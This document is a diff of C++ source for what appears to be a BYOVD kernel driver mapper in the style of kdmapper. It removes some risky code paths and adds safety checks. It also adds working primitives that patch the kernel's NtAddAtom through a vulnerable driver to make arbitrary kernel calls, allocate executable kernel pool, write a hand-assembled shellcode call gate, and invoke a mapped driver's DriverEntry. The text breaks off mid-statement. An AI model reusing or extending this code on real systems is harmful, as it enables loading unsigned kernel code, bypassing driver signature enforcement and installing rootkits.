@@ -11,6 +11,10 @@
 #include <mutex>
 #include <cstdlib>
 #include <cstdio>
+#include <array>
+#include <limits>
+#include <sddl.h>
+#include <atomic>
 
 // MinGW does not expose these in winternl.h by default.
 #ifndef SystemModuleInformation
@@ -42,10 +46,18 @@ typedef struct _RTL_PROCESS_MODULES {
 namespace hinv {
 namespace kmem {
 
+static std::atomic<bool> g_hookStateUncertain{ false };
+
+bool KernelCallsUsable() {
+    return !g_hookStateUncertain.load(std::memory_order_acquire);
+}
+
 static std::wstring ToLower(std::wstring s) {
     std::transform(s.begin(), s.end(), s.begin(), ::towlower);
     return s;
 }
+
+static bool IsKnownKernelBuild();
 
 // ---------------------------------------------------------------------------
 // Module name normalization
@@ -92,84 +104,6 @@ using NtQuerySystemInformationFn = NTSTATUS(NTAPI*)(
     ULONG SystemInformationLength,
     PULONG ReturnLength
 );
-
-// ---------------------------------------------------------------------------
-// Real DRIVER_OBJECT recovery (null.sys hijack support)
-// ---------------------------------------------------------------------------
-
-namespace {
-
-constexpr ULONG SystemExtendedHandleInformationClass = 64;
-constexpr NTSTATUS StatusInfoLengthMismatch = static_cast<NTSTATUS>(0xC0000004L);
-
-struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
-    PVOID     Object;
-    ULONG_PTR UniqueProcessId;
-    ULONG_PTR HandleValue;
-    ULONG     GrantedAccess;
-    USHORT    CreatorBackTraceIndex;
-    USHORT    ObjectTypeIndex;
-    ULONG     HandleAttributes;
-    ULONG     Reserved;
-};
-
-struct SYSTEM_HANDLE_INFORMATION_EX {
-    ULONG_PTR NumberOfHandles;
-    ULONG_PTR Reserved;
-    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
-};
-
-} // namespace
-
-uint64_t GetDriverObjectFromHandle(byovd::IByovdBackend* backend, HANDLE deviceHandle) {
-    if (!backend || !deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) return 0;
-
-    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(reinterpret_cast<void*>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
-    if (!NtQuerySystemInformation) return 0;
-
-    // On this build a NULL buffer returns only the header; the real size
-    // arrives via ReturnLength of a small fill attempt. Grow one in/out
-    // variable until SUCCESS (kdmapper pattern).
-    ULONG size = 1u << 20;
-    std::vector<uint8_t> buf;
-    NTSTATUS st = StatusInfoLengthMismatch;
-    for (int tries = 0; tries < 16 && st == StatusInfoLengthMismatch; ++tries) {
-        buf.resize(size);
-        ULONG retLen = 0;
-        st = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformationClass),
-                                      buf.data(), size, &retLen);
-        if (st == StatusInfoLengthMismatch)
-            size = (retLen > size) ? retLen + 0x10000 : size * 2;
-    }
-    if (!NT_SUCCESS(st)) return 0;
-
-    auto* info = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buf.data());
-    const ULONG_PTR maxHandles =
-        (buf.size() >= offsetof(SYSTEM_HANDLE_INFORMATION_EX, Handles))
-            ? (buf.size() - offsetof(SYSTEM_HANDLE_INFORMATION_EX, Handles)) / sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)
-            : 0;
-    if (info->NumberOfHandles > maxHandles) return 0;
-
-    const ULONG_PTR selfPid = GetCurrentProcessId();
-    const ULONG_PTR targetHandle = reinterpret_cast<ULONG_PTR>(deviceHandle);
-    uint64_t fileObject = 0;
-    for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i) {
-        const auto& e = info->Handles[i];
-        if (e.UniqueProcessId == selfPid && e.HandleValue == targetHandle) {
-            fileObject = reinterpret_cast<uint64_t>(e.Object);
-            break;
-        }
-    }
-    if (!fileObject) return 0;
-
-    // x64: FILE_OBJECT.DeviceObject @ 0x8, DEVICE_OBJECT.DriverObject @ 0x8.
-    uint64_t deviceObject = 0;
-    uint64_t driverObject = 0;
-    if (!ReadU64(backend, fileObject + 0x8, deviceObject) || !deviceObject) return 0;
-    if (!ReadU64(backend, deviceObject + 0x8, driverObject) || !driverObject) return 0;
-    return driverObject;
-}
 
 std::vector<KernelModule> EnumKernelModules() {
     std::vector<KernelModule> result;
@@ -326,9 +260,10 @@ static std::vector<MappedModule> g_mappedModules;
 void RegisterMappedModule(const std::wstring& moduleName, uint64_t base, uint32_t size) {
     if (moduleName.empty() || !base || !size) return;
 
-    std::wstring name = ToLower(moduleName);
-    size_t slash = name.find_last_of(L"\\/");
-    if (slash != std::wstring::npos) name = name.substr(slash + 1);
+    std::wstring name = NormalizeModuleName(moduleName);
+    // A mapped image must never shadow a real system module during import
+    // resolution. Such a name is either accidental or hostile input.
+    if (name == L"ntoskrnl.exe" || name == L"hal.dll" || name == L"ci.dll") return;
 
     std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
     for (auto& m : g_mappedModules) {
@@ -339,6 +274,18 @@ void RegisterMappedModule(const std::wstring& moduleName, uint64_t base, uint32_
         }
     }
     g_mappedModules.push_back({ name, base, size });
+}
+
+void UnregisterMappedModule(const std::wstring& moduleName, uint64_t base) {
+    if (moduleName.empty()) return;
+    const std::wstring name = NormalizeModuleName(moduleName);
+    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
+    g_mappedModules.erase(
+        std::remove_if(g_mappedModules.begin(), g_mappedModules.end(),
+                       [&](const MappedModule& module) {
+                           return module.name == name && (!base || module.base == base);
+                       }),
+        g_mappedModules.end());
 }
 
 // Returns the base of a registered mapped module, or 0. lowerName must
@@ -423,111 +370,63 @@ uint64_t FindInvertedFunctionTable(byovd::IByovdBackend* backend, uint64_t looku
 bool InsertInvertedFunctionTableEntryAt(byovd::IByovdBackend* backend, uint64_t tableVa,
                                         uint64_t functionTableVa, uint64_t imageBase,
                                         uint32_t imageSize, uint32_t tableSize) {
-    uint32_t cur = 0, max = 0, epoch = 0;
-    uint8_t overflow = 0;
-    if (!ReadIftHeader(backend, tableVa, cur, max, overflow)) return false;
-    // Overflow means the kernel already gave up on the table once; inserts are
-    // no longer consulted the same way. Fail closed instead of writing anyway.
-    if (overflow != 0 || cur >= max) return false;
-    if (!ReadU32(backend, tableVa + IFT_EPOCH, epoch)) return false;
-
-    // Entries [1, cur) are sorted ascending by ImageBase; entry [0] is the
-    // kernel's MRU/hot slot (ntoskrnl in practice) and must NOT be shifted —
-    // insert before the first greater entry among [1, cur), never at [0].
-    // Same base => already registered, treat as success.
-    uint32_t pos = cur;
-    for (uint32_t i = (cur > 0 ? 1 : 0); i < cur; ++i) {
-        uint64_t entryBase = 0;
-        if (!ReadU64(backend, tableVa + IFT_ENTRIES + i * IFT_STRIDE + IFT_ENT_BASE, entryBase)) return false;
-        if (entryBase == imageBase) return true;
-        if (entryBase > imageBase && pos == cur) pos = i;
+    uint32_t epoch = 0;
+    if (!backend || !tableVa || !ReadU32(backend, tableVa + IFT_EPOCH, epoch))
+        return false;
+    if ((epoch & 1u) != 0) {
+        Trace("kmem: refusing PsInvertedFunctionTable insert during odd epoch");
+        return false;
     }
-
-    // Odd epoch signals "mutation in progress" to lock-free readers, matching
-    // the kernel's lock-inc-before / lock-inc-after pattern.
-    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 1)) return false;
-
-    // Shift [pos, cur) up one slot, back to front.
-    for (uint32_t i = cur; i > pos; --i) {
-        uint8_t entry[IFT_STRIDE]{};
-        uint64_t src = tableVa + IFT_ENTRIES + (i - 1) * IFT_STRIDE;
-        if (!backend->ReadKernelMemory(src, entry, IFT_STRIDE)) return false;
-        if (!backend->WriteKernelMemory(src + IFT_STRIDE, entry, IFT_STRIDE)) return false;
-    }
-
-    uint64_t slot = tableVa + IFT_ENTRIES + pos * IFT_STRIDE;
-    if (!WriteU64(backend, slot + 0x00, functionTableVa)) return false;
-    if (!WriteU64(backend, slot + 0x08, imageBase)) return false;
-    if (!WriteU32(backend, slot + 0x10, imageSize)) return false;
-    if (!WriteU32(backend, slot + 0x14, tableSize)) return false;
-
-    if (!WriteU32(backend, tableVa + IFT_CURSIZE, cur + 1)) return false;
-    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 2)) return false;
-
-    // Read-back: a torn or misdirected write here corrupts every future
-    // exception dispatch — confirm the slot landed before declaring success.
-    uint64_t rbFt = 0, rbBase = 0;
-    uint32_t rbImg = 0, rbTbl = 0;
-    if (!ReadU64(backend, slot + 0x00, rbFt) || !ReadU64(backend, slot + 0x08, rbBase) ||
-        !ReadU32(backend, slot + 0x10, rbImg) || !ReadU32(backend, slot + 0x14, rbTbl)) return false;
-    return rbFt == functionTableVa && rbBase == imageBase && rbImg == imageSize && rbTbl == tableSize;
+    (void)functionTableVa;
+    (void)imageBase;
+    (void)imageSize;
+    (void)tableSize;
+    // Epoch is a reader sequence counter, not the writer lock. The private
+    // lock/routine that owns this table is build-specific and is not exposed
+    // by the supported user-mode/BYOVD interface. Never perform independent
+    // writes here: a loader thread could observe a torn table and unwind any
+    // kernel thread through attacker-controlled addresses.
+    Trace("kmem: refusing unsynchronized PsInvertedFunctionTable insert");
+    return false;
 }
 
 bool RemoveInvertedFunctionTableEntryAt(byovd::IByovdBackend* backend, uint64_t tableVa,
                                         uint64_t imageBase) {
-    uint32_t cur = 0, max = 0, epoch = 0;
-    uint8_t overflow = 0;
-    if (!ReadIftHeader(backend, tableVa, cur, max, overflow)) return false;
-    if (!ReadU32(backend, tableVa + IFT_EPOCH, epoch)) return false;
-
-    uint32_t pos = cur;
-    for (uint32_t i = 0; i < cur; ++i) {
-        uint64_t entryBase = 0;
-        if (!ReadU64(backend, tableVa + IFT_ENTRIES + i * IFT_STRIDE + IFT_ENT_BASE, entryBase)) return false;
-        if (entryBase == imageBase) { pos = i; break; }
+    uint32_t epoch = 0;
+    if (!backend || !tableVa || !ReadU32(backend, tableVa + IFT_EPOCH, epoch))
+        return false;
+    if ((epoch & 1u) != 0) {
+        Trace("kmem: refusing PsInvertedFunctionTable removal during odd epoch");
+        return false;
     }
-    if (pos == cur) return true; // nothing to remove
-
-    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 1)) return false;
-
-    for (uint32_t i = pos; i + 1 < cur; ++i) {
-        uint8_t entry[IFT_STRIDE]{};
-        uint64_t src = tableVa + IFT_ENTRIES + (i + 1) * IFT_STRIDE;
-        if (!backend->ReadKernelMemory(src, entry, IFT_STRIDE)) return false;
-        if (!backend->WriteKernelMemory(src - IFT_STRIDE, entry, IFT_STRIDE)) return false;
-    }
-
-    if (!WriteU32(backend, tableVa + IFT_CURSIZE, cur - 1)) return false;
-    if (!WriteU32(backend, tableVa + IFT_EPOCH, epoch + 2)) return false;
-    return true;
+    (void)imageBase;
+    Trace("kmem: refusing unsynchronized PsInvertedFunctionTable removal");
+    return false;
 }
 
 } // namespace detail
 
 uint64_t ResolveInvertedFunctionTable(byovd::IByovdBackend* backend) {
-    static std::mutex s_mutex;
-    static uint64_t s_table = 0;
-    std::lock_guard<std::mutex> lock(s_mutex);
-    if (s_table) return s_table;
-
-    uint64_t lookupFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlLookupFunctionEntry");
-    if (!lookupFn) return 0;
-    s_table = detail::FindInvertedFunctionTable(backend, lookupFn);
-    return s_table;
+    (void)backend;
+    std::cerr << "[hinv::kmem] PsInvertedFunctionTable is read-only to hinv; no private lock is available\n";
+    return 0;
 }
 
 bool InsertInvertedFunctionTableEntry(byovd::IByovdBackend* backend, uint64_t functionTableVa,
                                       uint64_t imageBase, uint32_t imageSize, uint32_t tableSize) {
-    uint64_t table = ResolveInvertedFunctionTable(backend);
-    if (!table) return false;
-    return detail::InsertInvertedFunctionTableEntryAt(backend, table, functionTableVa,
-                                                      imageBase, imageSize, tableSize);
+    (void)backend;
+    (void)functionTableVa;
+    (void)imageBase;
+    (void)imageSize;
+    (void)tableSize;
+    std::cerr << "[hinv::kmem] Refusing manual PsInvertedFunctionTable mutation; use a supported loader API\n";
+    return false;
 }
 
 bool RemoveInvertedFunctionTableEntry(byovd::IByovdBackend* backend, uint64_t imageBase) {
-    uint64_t table = ResolveInvertedFunctionTable(backend);
-    if (!table) return false;
-    return detail::RemoveInvertedFunctionTableEntryAt(backend, table, imageBase);
+    (void)backend;
+    (void)imageBase;
+    return false;
 }
 
 // ---------------------------------------------------------------------------
@@ -546,7 +445,9 @@ OsVersionInfo GetOsVersion() {
             info.major = os.dwMajorVersion;
             info.minor = os.dwMinorVersion;
             info.build = os.dwBuildNumber;
-            info.revision = os.dwPlatformId; // not revision; kept for compatibility
+            // RTL_OSVERSIONINFOW has no revision field. Do not expose
+            // dwPlatformId as if it were one.
+            info.revision = 0;
         }
     }
     return info;
@@ -601,27 +502,231 @@ void* UserNtAddAtom() {
     return reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAddAtom"));
 }
 
-bool InstallCallHook(byovd::IByovdBackend* backend, uint64_t target, uint8_t (&original)[12]) {
-    Trace("kmem: hook install begin");
-    uint64_t ntAddAtom = KernelNtAddAtom(backend);
-    if (!ntAddAtom || !UserNtAddAtom()) { Trace("kmem: hook install failed (resolve)"); return false; }
+HANDLE GlobalCallHookMutex() {
+    static HANDLE mutex = [] {
+        PSECURITY_DESCRIPTOR descriptor = nullptr;
+        if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
+                L"D:P(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1,
+                &descriptor, nullptr))
+            return static_cast<HANDLE>(nullptr);
 
-    if (!backend->ReadKernelMemory(ntAddAtom, original, 12)) { Trace("kmem: hook install failed (read)"); return false; }
-
-    uint8_t stub[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
-    std::memcpy(stub + 2, &target, 8);
-    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, stub, sizeof(stub));
-    Trace(ok ? "kmem: hook installed" : "kmem: hook install failed (write)");
-    return ok;
+        SECURITY_ATTRIBUTES attributes{};
+        attributes.nLength = sizeof(attributes);
+        attributes.lpSecurityDescriptor = descriptor;
+        attributes.bInheritHandle = FALSE;
+        HANDLE handle = CreateMutexW(&attributes, FALSE, L"Global\\hinv_NtAddAtomHook");
+        LocalFree(descriptor);
+        return handle;
+    }();
+    return mutex;
 }
 
-bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[12]) {
+HookInstallStatus InstallCallHook(byovd::IByovdBackend* backend, uint64_t target,
+                                  uint8_t (&original)[8]) {
+    Trace("kmem: hook install begin");
+    uint64_t ntAddAtom = KernelNtAddAtom(backend);
+    if (!ntAddAtom || !UserNtAddAtom() || (ntAddAtom & 7) != 0) {
+        Trace("kmem: hook install failed (resolve/alignment)");
+        return HookInstallStatus::Failed;
+    }
+
+    if (!backend->ReadKernelMemory(ntAddAtom, original, sizeof(original))) {
+        Trace("kmem: hook install failed (read)");
+        return HookInstallStatus::Failed;
+    }
+
+    // A pre-existing relative jump means another instance already owns the
+    // global patch. Do not overwrite it or lose the bytes needed for its
+    // restore. NtAddAtom itself does not begin with this form on supported
+    // builds.
+    if (original[0] == 0xE9) {
+        Trace("kmem: hook install refused (already patched)");
+        return HookInstallStatus::Failed;
+    }
+
+    const int64_t delta = static_cast<int64_t>(target) -
+                          static_cast<int64_t>(ntAddAtom + 5);
+    if (delta < static_cast<int64_t>(std::numeric_limits<int32_t>::min()) ||
+        delta > static_cast<int64_t>(std::numeric_limits<int32_t>::max())) {
+        Trace("kmem: hook install refused (target outside rel32 range)");
+        return HookInstallStatus::Failed;
+    }
+
+    // The first five bytes are a relative jump. The remaining three bytes are
+    // copied from the original prologue and are never executed after a
+    // successful fetch of the atomically published instruction bundle.
+    uint8_t patch[8]{};
+    patch[0] = 0xE9;
+    const int32_t relative = static_cast<int32_t>(delta);
+    std::memcpy(patch + 1, &relative, sizeof(relative));
+    std::memcpy(patch + 5, original + 5, 3);
+    uint64_t atomicPatch = 0;
+    std::memcpy(&atomicPatch, patch, sizeof(atomicPatch));
+
+    // A false return is treated as uncertain. The backend contract requires a
+    // single aligned store, but this caller cannot prove whether an external
+    // driver failed after touching the physical mapping.
+    if (!backend->WriteReadOnlyMemoryAtomic8(ntAddAtom, atomicPatch)) {
+        MarkHookStateUncertain();
+        Trace("kmem: CRITICAL hook install state uncertain");
+        return HookInstallStatus::Uncertain;
+    }
+
+    uint8_t verify[8]{};
+    if (backend->ReadKernelMemory(ntAddAtom, verify, sizeof(verify)) &&
+        std::memcmp(verify, patch, sizeof(patch)) == 0) {
+        Trace("kmem: hook installed atomically");
+        return HookInstallStatus::Installed;
+    }
+
+    uint64_t originalValue = 0;
+    std::memcpy(&originalValue, original, sizeof(originalValue));
+    const bool restored = backend->WriteReadOnlyMemoryAtomic8(ntAddAtom, originalValue);
+    Trace(restored ? "kmem: hook install rolled back" :
+                     "kmem: CRITICAL hook install rollback FAILED");
+    if (!restored) MarkHookStateUncertain();
+    return restored ? HookInstallStatus::Failed : HookInstallStatus::Uncertain;
+}
+
+bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[8]) {
     Trace("kmem: hook remove begin");
     uint64_t ntAddAtom = KernelNtAddAtom(backend);
     if (!ntAddAtom) return false;
-    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, original, 12);
+
+    uint64_t originalValue = 0;
+    std::memcpy(&originalValue, original, sizeof(originalValue));
+    bool ok = false;
+    for (int attempt = 0; attempt < 3 && !ok; ++attempt) {
+        if (!backend->WriteReadOnlyMemoryAtomic8(ntAddAtom, originalValue)) continue;
+        uint8_t verify[8]{};
+        ok = backend->ReadKernelMemory(ntAddAtom, verify, sizeof(verify)) &&
+             std::memcmp(verify, original, sizeof(verify)) == 0;
+    }
+    if (!ok) MarkHookStateUncertain();
     Trace(ok ? "kmem: hook removed" : "kmem: hook remove failed");
     return ok;
+}
+
+template<typename T, typename... A>
+static KernelCallStatus DirectKernelCall(byovd::IByovdBackend* backend, T* outResult,
+                                         uint64_t target, A... args) {
+    if (!KernelCallsUsable()) return KernelCallStatus::RestorationUncertain;
+    uint8_t original[8]{};
+    const auto install = InstallCallHook(backend, target, original);
+    if (install == HookInstallStatus::Uncertain)
+        return KernelCallStatus::RestorationUncertain;
+    if (install != HookInstallStatus::Installed)
+        return KernelCallStatus::NotExecuted;
+
+    using Fn = T(__stdcall*)(A...);
+    auto fn = reinterpret_cast<Fn>(UserNtAddAtom());
+    if (!fn)
+        return RemoveCallHook(backend, original)
+            ? KernelCallStatus::NotExecuted
+            : KernelCallStatus::RestorationUncertain;
+
+    if constexpr (std::is_same_v<T, void>) {
+        (void)outResult;
+        fn(args...);
+    } else {
+        if (!outResult) {
+            return RemoveCallHook(backend, original)
+                ? KernelCallStatus::NotExecuted
+                : KernelCallStatus::RestorationUncertain;
+        }
+        *outResult = fn(args...);
+    }
+
+    return RemoveCallHook(backend, original)
+        ? KernelCallStatus::Executed
+        : KernelCallStatus::RestorationUncertain;
+}
+
+static uint64_t g_callGate = 0;
+
+KernelCallStatus PrepareCallGate(byovd::IByovdBackend* backend, uint64_t& gateVa,
+                                 uint64_t& ownerKthread) {
+    if (!backend) return KernelCallStatus::NotExecuted;
+
+    uint64_t threadFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "PsGetCurrentThread");
+    if (!threadFn) {
+        Trace("kmem: call gate failed (PsGetCurrentThread unresolved)");
+        return KernelCallStatus::NotExecuted;
+    }
+
+    if (!g_callGate) {
+        const uint64_t allocFn = ResolveKernelExport(
+            backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
+        if (!allocFn) return KernelCallStatus::NotExecuted;
+
+        // NonPagedPoolExecute avoids a second arbitrary call while the global
+        // hook is still in bootstrap mode. The allocation target is benign for
+        // unrelated NtAddAtom calls (they cannot dereference caller pointers).
+        uint64_t allocated = 0;
+        const auto allocation = DirectKernelCall(
+            backend, &allocated, allocFn, 4ULL, 0x100ULL, 0x766E6968ULL);
+        if (allocation != KernelCallStatus::Executed)
+            return allocation;
+        if (!allocated) return KernelCallStatus::NotExecuted;
+
+        const uint64_t ntAddAtom = KernelNtAddAtom(backend);
+        const int64_t gateDelta = static_cast<int64_t>(allocated) -
+                                  static_cast<int64_t>(ntAddAtom + 5);
+        if ((allocated & 7) != 0 ||
+            gateDelta < static_cast<int64_t>(std::numeric_limits<int32_t>::min()) ||
+            gateDelta > static_cast<int64_t>(std::numeric_limits<int32_t>::max())) {
+            Trace("kmem: call gate refused (alignment/range)");
+            return KernelCallStatus::NotExecuted;
+        }
+        g_callGate = allocated;
+    }
+
+    uint64_t currentThread = 0;
+    const auto threadCall = DirectKernelCall(backend, &currentThread, threadFn);
+    if (threadCall != KernelCallStatus::Executed)
+        return threadCall;
+    if (!currentThread) return KernelCallStatus::NotExecuted;
+
+    gateVa = g_callGate;
+    ownerKthread = currentThread;
+    return KernelCallStatus::Executed;
+}
+
+bool ConfigureCallGate(byovd::IByovdBackend* backend, uint64_t gateVa,
+                       uint64_t ownerKthread, uint64_t target) {
+    if (!backend || !gateVa || !ownerKthread || !target) return false;
+
+    std::array<uint8_t, 64> code{};
+    size_t p = 0;
+    code[p++] = 0x51; // push rcx; preserve the first target argument
+    const uint8_t currentThread[] = { 0x65, 0x48, 0x8B, 0x04, 0x25,
+                                      0x88, 0x01, 0x00, 0x00 };
+    std::memcpy(code.data() + p, currentThread, sizeof(currentThread));
+    p += sizeof(currentThread);
+    code[p++] = 0x48; code[p++] = 0xB9; // mov rcx, ownerKthread
+    std::memcpy(code.data() + p, &ownerKthread, sizeof(ownerKthread));
+    p += sizeof(ownerKthread);
+    code[p++] = 0x48; code[p++] = 0x39; code[p++] = 0xC8; // cmp rax, rcx
+    code[p++] = 0x59; // pop rcx
+    code[p++] = 0x75; code[p++] = 0x0C; // reject if a different KTHREAD calls
+    code[p++] = 0x48; code[p++] = 0xB8; // mov rax, target
+    std::memcpy(code.data() + p, &target, sizeof(target));
+    p += sizeof(target);
+    code[p++] = 0xFF; code[p++] = 0xE0; // jmp rax
+    code[p++] = 0xB8; // mov eax, STATUS_ACCESS_VIOLATION
+    const uint32_t rejected = 0xC0000005u;
+    std::memcpy(code.data() + p, &rejected, sizeof(rejected));
+    p += sizeof(rejected);
+    code[p++] = 0xC3; // ret
+
+    if (!backend->WriteKernelMemory(gateVa, code.data(), p)) return false;
+    std::array<uint8_t, 64> verify{};
+    return backend->ReadKernelMemory(gateVa, verify.data(), p) &&
+           std::memcmp(code.data(), verify.data(), p) == 0;
+}
+
+void MarkHookStateUncertain() {
+    g_hookStateUncertain.store(true, std::memory_order_release);
 }
 
 } // namespace detail
@@ -684,6 +789,17 @@ static uint64_t GetNtoskrnlBase() {
     return 0;
 }
 
+static bool IsKnownKernelBuild() {
+    const auto os = GetOsVersion();
+    switch (os.build) {
+        case 19041: case 19042: case 19043: case 19044: case 19045:
+        case 22000: case 22621: case 22631: case 26100: case 26200:
+            return os.major == 10;
+        default:
+            return false;
+    }
+}
+
 // MmSetPageProtection is documented since 1803 but not always exported. When
 // the export is missing, recover it with kdmapper's PAGELK pattern: a
 // `cmovcc + lea + call` sequence whose final E8 calls MmSetPageProtection.
@@ -696,6 +812,10 @@ static uint64_t ResolveMmSetPageProtection(byovd::IByovdBackend* backend) {
 
     uint64_t ntosBase = GetNtoskrnlBase();
     if (!ntosBase) return 0;
+    if (!IsKnownKernelBuild()) {
+        std::cerr << "[hinv::kmem] Refusing MmSetPageProtection pattern scan on unknown Windows build\n";
+        return 0;
+    }
 
     IMAGE_NT_HEADERS64 nt{};
     {
@@ -743,8 +863,10 @@ static uint64_t ResolveMmSetPageProtection(byovd::IByovdBackend* backend) {
 // Kernel memory allocation / protection / driver entry
 // ---------------------------------------------------------------------------
 
-bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa) {
-    if (!backend || size == 0) return false;
+KernelCallStatus AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size,
+                                      uint64_t& outKernelVa) {
+    outKernelVa = 0;
+    if (!backend || size == 0) return KernelCallStatus::NotExecuted;
 
     // Same primitive kdmapper uses: ExAllocatePoolWithTag(NonPagedPool, ...).
     // The pool is NX on Win8+; callers that execute from it must flip
@@ -752,59 +874,164 @@ bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& 
     uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
     if (!allocFn) {
         std::cerr << "[hinv::kmem] ExAllocatePoolWithTag not found\n";
-        return false;
+        return KernelCallStatus::NotExecuted;
     }
 
     constexpr uint64_t NonPagedPool = 0;
     constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
     uint64_t allocated = 0;
-    if (!CallKernelFunction(backend, &allocated, allocFn, NonPagedPool,
-                            static_cast<uint64_t>(size), HinvTag))
-        return false;
+    const auto call = CallKernelFunction(backend, &allocated, allocFn, NonPagedPool,
+                                         static_cast<uint64_t>(size), HinvTag);
+    if (call != KernelCallStatus::Executed) return call;
 
     outKernelVa = allocated;
-    return outKernelVa != 0;
+    return KernelCallStatus::Executed;
 }
 
-bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
-    if (!backend || !kernelVa) return false;
+KernelCallStatus FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
+    if (!backend || !kernelVa) return KernelCallStatus::NotExecuted;
 
     uint64_t freeFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePoolWithTag");
     if (!freeFn) {
         std::cerr << "[hinv::kmem] ExFreePoolWithTag not found\n";
-        return false;
+        return KernelCallStatus::NotExecuted;
     }
 
     constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
     return CallKernelFunction<void>(backend, nullptr, freeFn, kernelVa, HinvTag);
 }
 
-bool ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa, size_t size, uint32_t protect) {
-    if (!backend || !kernelVa || !size) return false;
+KernelCallStatus ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa,
+                                     size_t size, uint32_t protect, bool* outProtected) {
+    if (outProtected) *outProtected = false;
+    if (!backend || !kernelVa || !size) return KernelCallStatus::NotExecuted;
 
     uint64_t setProtFn = ResolveMmSetPageProtection(backend);
     if (!setProtFn) {
         std::cerr << "[hinv::kmem] MmSetPageProtection not found\n";
-        return false;
+        return KernelCallStatus::NotExecuted;
     }
 
     uint8_t ok = 0; // BOOLEAN
-    if (!CallKernelFunction(backend, &ok, setProtFn, kernelVa,
-                            static_cast<uint64_t>(size), static_cast<uint64_t>(protect)))
-        return false;
-    return ok != 0;
+    const auto call = CallKernelFunction(backend, &ok, setProtFn, kernelVa,
+                                         static_cast<uint64_t>(size), static_cast<uint64_t>(protect));
+    if (outProtected) *outProtected = ok != 0;
+    return call;
 }
 
-uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
-                         uint64_t driverObjectVa, uint64_t registryPathVa) {
-    if (!backend || !driverEntryVa) return STATUS_INVALID_PARAMETER;
+KernelCallStatus CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
+                                 uint64_t driverObjectVa, uint64_t registryPathVa,
+                                 uint32_t& outStatus) {
+    outStatus = STATUS_UNSUCCESSFUL;
+    if (!backend || !driverEntryVa) return KernelCallStatus::NotExecuted;
 
-    uint32_t status = STATUS_UNSUCCESSFUL;
-    if (!CallKernelFunction(backend, &status, driverEntryVa, driverObjectVa, registryPathVa)) {
+    const auto call = CallKernelFunction(backend, &outStatus, driverEntryVa,
+                                         driverObjectVa, registryPathVa);
+    if (call != KernelCallStatus::Executed) {
         std::cerr << "[hinv::kmem] CallDriverEntry: kernel call failed\n";
-        return STATUS_UNSUCCESSFUL;
     }
-    return status;
+    return call;
+}
+
+RealDriverEntryResult CallDriverEntryWithRealObject(byovd::IByovdBackend* backend,
+                                                    uint64_t driverEntryVa) {
+    RealDriverEntryResult result{};
+    if (!backend || !driverEntryVa) return result;
+
+    uint64_t ioCreateDriver = ResolveKernelExport(backend, L"ntoskrnl.exe", "IoCreateDriver");
+    if (!ioCreateDriver) {
+        std::cerr << "[hinv::kmem] IoCreateDriver not found\n";
+        return result;
+    }
+
+    // The callback receives the object created by IoCreateDriver in RCX. A
+    // tiny executable callback records that pointer and DriverEntry's status
+    // before returning to IoCreateDriver. Without this wrapper the mapper
+    // cannot safely retain devices created by the real driver object.
+    constexpr size_t kCaptureSize = 0x20;
+    uint64_t captureVa = 0;
+    const auto captureAlloc = AllocateKernelMemory(backend, kCaptureSize, captureVa);
+    if (captureAlloc != KernelCallStatus::Executed || !captureVa) {
+        result.callStatus = captureAlloc;
+        return result;
+    }
+    std::array<uint8_t, kCaptureSize> zeros{};
+    if (!backend->WriteKernelMemory(captureVa, zeros.data(), zeros.size())) {
+        FreeKernelMemory(backend, captureVa);
+        return result;
+    }
+
+    uint64_t callbackVa = 0;
+    const auto callbackAlloc = AllocateKernelMemory(backend, 0x40, callbackVa);
+    if (callbackAlloc != KernelCallStatus::Executed || !callbackVa) {
+        FreeKernelMemory(backend, captureVa);
+        result.callStatus = callbackAlloc;
+        return result;
+    }
+
+    std::array<uint8_t, 0x40> callback{};
+    size_t p = 0;
+    // mov rax, capture; mov [rax], rcx
+    callback[p++] = 0x48; callback[p++] = 0xB8;
+    std::memcpy(callback.data() + p, &captureVa, sizeof(captureVa)); p += 8;
+    callback[p++] = 0x48; callback[p++] = 0x89; callback[p++] = 0x08;
+    // mov rax, driverEntry; call rax
+    callback[p++] = 0x48; callback[p++] = 0xB8;
